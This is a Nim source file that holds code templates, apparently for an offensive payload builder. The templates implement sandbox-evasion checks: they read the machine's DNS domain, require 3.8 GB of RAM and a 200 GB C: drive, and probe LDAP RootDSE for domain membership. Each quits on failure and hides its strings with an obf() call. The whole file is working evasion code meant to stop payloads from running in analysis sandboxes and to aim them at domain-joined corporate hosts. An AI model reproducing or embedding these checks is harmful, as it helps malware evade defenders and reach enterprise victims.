import strformat
import strutils

let DomainCheckStub * = """

# code modified from here -> https://github.com/rominf/nim-hostname/blob/d517210adedf7f6c708393ddd20fd7a93504f262/src/hostname.nim
when defined(windows):
  # https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ne-sysinfoapi-computer_name_format
  const ComputerNameDnsDomain = 2
  # For testing purposes only
  const ComputerNameDnsFullyQualified = 3
elif defined(posix):
  import posix

proc getDomain*(): string {.tags: [ReadIOEffect].} =
  ## Returns domain name only.
  ## On Windows (see
  ## https://docs.microsoft.com/en-us/windows/win32/sysinfo/computer-names)
  ## returns ComputerNamePhysicalDnsHostname.
  # On POSIX SUSv2 guarantees that "Host names are limited to 255 bytes".
  # https://tools.ietf.org/html/rfc1035#section-2.3.1
  # https://tools.ietf.org/html/rfc2181#section-11
  const size = 256
  result = newString(size)
  when defined(windows):
    proc getComputerNameExA(nameType: cint, name: cstring, len: PDWORD): WINBOOL
      {.stdcall, dynlib: "kernel32", importc: "GetComputerNameExA", sideEffect.}
    var resultLen: DWORD = DWORD(size)
    let success = getComputerNameExA(ComputerNameDnsDomain,
                                     result.cstring, resultLen.addr) != 0
  elif defined(posix):
    let success = getDomain(result, size) == 0
    let resultLen = len(cstring(result))
  else:
    doAssert false, obf("getDomain failed: OS is not supported")
  if not success:
      echo obf("Failed to get Domain")
  result.setLen(resultLen)

"""


let MemorySpaceStub * = """

from winim import GlobalMemoryStatusEx,DWORD,MEMORYSTATUSEX

var statex: MEMORYSTATUSEX

proc MemoryCheck*(): bool =
    var gofurther: bool = false

    statex.dwLength = cast[DWORD](sizeof(statex))
    GlobalMemoryStatusEx(addr statex)
    var totalPhys = float(statex.ullTotalPhys) / float(1024*1024*1024)
    # If more than 4GB RAM available return true
    if(totalPhys >= 3.8):
        gofurther = true
        return gofurther
    else:
        return gofurther

when isMainModule:
    if (MemoryCheck() == false):
        echo obf("Not enough memory")
        quit()

"""


let DiskSpaceStub * = """

from winim import GetDiskFreeSpaceEx,ULARGE_INTEGER,NTSTATUS
import winim/winstr

proc DiskSizeCheck*(): bool =

    var
        uliUserFree: ULARGE_INTEGER
        uliTotal: ULARGE_INTEGER
        uliRealFree: ULARGE_INTEGER
        success: NTSTATUS
        result: float
        gofurther: bool

    success = GetDiskFreeSpaceEx("C:\\",addr uliUserFree, addr uliTotal, addr uliRealFree)
    result = float(uliTotal.QuadPart) / float((1024*1024*1024))
    #echo "Size in GB: " & $result
    if(result >= 200):
        gofurther = true
        return gofurther
    else:
        return gofurther

when isMainModule:
    if (DiskSizeCheck() == false):
        echo obf("Disk too small")
        quit()

"""

let DomainJoinStub * = """
# This will check for ANY domain join
from winim/com import GetObject
try:
    discard GetObject(obf("LDAP://RootDSE"))
except:
    quit()
finally:
    echo ""
"""